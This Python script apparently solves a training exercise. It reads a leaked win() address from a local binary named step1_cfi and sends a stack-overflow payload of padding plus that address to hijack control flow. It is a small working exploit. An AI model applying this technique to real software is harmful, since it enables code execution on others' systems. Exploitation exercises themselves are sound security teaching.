import re
import struct
import subprocess


def main() -> None:
    binary = "./step1_cfi"
    cmd = "echo 'ARBITRARY CODE EXECUTION STEP1'"

    proc = subprocess.Popen(
        [binary, cmd],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    first_line = proc.stdout.readline()
    match = re.search(rb"0x([0-9a-fA-F]+)", first_line)
    if not match:
        raise RuntimeError("failed to read win() address")

    win_addr = int(match.group(1), 16)
    payload = b"A" * 32 + struct.pack("<Q", win_addr)

    proc.stdin.write(payload)
    proc.stdin.close()

    rest = proc.stdout.read().decode(errors="ignore")
    print(first_line.decode(errors="ignore").strip())
    print(rest.strip())


if __name__ == "__main__":
    main()
